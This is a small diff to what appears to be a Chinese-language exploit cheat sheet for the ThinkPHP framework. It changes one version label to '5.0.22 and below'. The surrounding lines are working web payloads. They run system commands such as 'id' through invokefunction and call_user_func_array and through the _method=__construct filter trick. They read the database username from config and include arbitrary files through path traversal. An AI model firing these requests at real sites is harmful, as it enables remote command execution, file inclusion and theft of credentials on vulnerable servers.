@@ -149,7 +149,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
 ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 
-5.0.x ：
+5.0.22及以下 ：
 ?s=index/think\config/get&name=database.username # 获取配置信息
 ?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
 ?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
